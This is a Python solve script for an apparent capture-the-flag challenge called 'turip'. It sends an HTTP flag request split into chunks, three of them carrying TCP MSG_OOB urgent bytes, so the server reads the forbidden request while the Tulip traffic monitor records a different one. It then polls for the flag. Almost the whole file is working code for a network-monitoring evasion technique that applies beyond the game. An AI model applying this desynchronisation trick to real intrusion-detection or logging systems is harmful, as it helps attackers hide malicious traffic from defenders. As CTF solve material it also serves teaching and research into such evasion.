#!/usr/bin/env python3
"""
turip. Sends the canonical request in five chunks, three of them MSG_OOB, so
each urgent byte lands inside one of the forbidden needles. Linux strips those
from gunicorn's read, gopacket keeps them, so Tulip stores a different
request.
The 0.6 s pause between sends matters, a second MSG_OOB overwrites urg_seq
before the reader has consumed the first.
"""
import argparse
import json
import socket
import sys
import time
_CH = __import__("os").path.dirname(__import__("os").path.dirname(__import__("os").path.abspath(__file__)))

sys.path.insert(
    0,
    f"{_CH}/solve",
)
import lib  # noqa: E402
import requests  # noqa: E402

HOST, PORT = "2.29.39.4", 1337
BASE = f"http://{HOST}:{PORT}"
BODY = b'{"supersecretkey":"turip_ip_ip","ip":"1337.0.0.1"}'


def log(*a):
    print(f"[{time.strftime('%H:%M:%S')}]", *a, flush=True)


def auth():
    s = requests.Session()
    r = s.post(BASE + "/auth", json={"token": lib.team_token()}, timeout=25)
    log("auth", r.status_code, r.text[:120])
    r.raise_for_status()
    cookie = s.cookies.get("turip_session")
    if not cookie:
        raise SystemExit("no session cookie")
    return s, cookie


def flag_request(cookie, pause=0.6):
    """Send the canonical request with three urgent junk bytes woven in."""
    headers = (
        b"ag1337 HTTP/1.1\r\n"
        b"Host: 2.29.39.4:1337\r\n"
        b"Cookie: turip_session=" + cookie.encode() + b"\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: " + str(len(BODY)).encode() + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )
    # (chunk, urgent?)  -- an urgent chunk's LAST byte is the junk byte.
    parts = [
        (b"POST /get_flZ", True),          # breaks  get_flag1337
        (headers, False),
        (b'{"supersecretkey":"turip_X', True),   # breaks  turip_ip_ip
        (b'ip_ip","ip":"1337.Y', True),          # breaks  1337.0.0.1
        (b'0.0.1"}', False),
    ]

    wire = b"".join(p for p, _ in parts)
    app_sees = b"".join(p[:-1] if u else p for p, u in parts)
    expect = b"POST /get_flag1337 HTTP/1.1\r\n"
    assert app_sees.startswith(expect), app_sees[:60]
    assert app_sees.endswith(BODY), app_sees[-60:]
    for needle in (b"get_flag1337", b"turip_ip_ip", b"1337.0.0.1",
                   b"GET /get_flag1337", b"POST /get_flag1337"):
        assert needle not in wire, f"needle {needle!r} still on the wire"
    log("wire is needle-free; app will read the canonical request")

    c = socket.create_connection((HOST, PORT), timeout=25)
    c.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    for chunk, urgent in parts:
        if urgent:
            c.send(chunk, socket.MSG_OOB)
        else:
            c.sendall(chunk)
        time.sleep(pause)

    c.settimeout(25)
    resp = b""
    try:
        while True:
            d = c.recv(65536)
            if not d:
                break
            resp += d
    except socket.timeout:
        pass
    c.close()
    return resp


def check(sess):
    r = sess.get(BASE + "/check", timeout=25)
    return r


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--probe", action="store_true",
                    help="only send the flag request, do not poll /check")
    ap.add_argument("--pause", type=float, default=0.6)
    ap.add_argument("--wait", type=float, default=32.0)
    ap.add_argument("--tries", type=int, default=8)
    args = ap.parse_args()

    sess, cookie = auth()
    resp = flag_request(cookie, args.pause)
    head = resp.split(b"\r\n\r\n", 1)[0]
    log("flag-request response:")
    print(head.decode("latin1"), flush=True)
    if b" 200 " not in head.split(b"\r\n")[0]:
        log("request rejected; body or RAW_URI was mangled")
        return 1
    if args.probe:
        return 0

    log(f"sleeping {args.wait}s for pcap rotation + assembler ingest")
    time.sleep(args.wait)
    for i in range(args.tries):
        r = check(sess)
        log(f"/check try {i + 1}: {r.status_code} {r.text[:300]}")
        if r.status_code == 200:
            print("\n=== FLAG ===")
            print(r.text)
            return 0
        if "forbidden request data" in r.text:
            log("Tulip DID reconstruct a needle; wire trick failed")
            return 1
        time.sleep(12)
    return 1


if __name__ == "__main__":
    sys.exit(main())
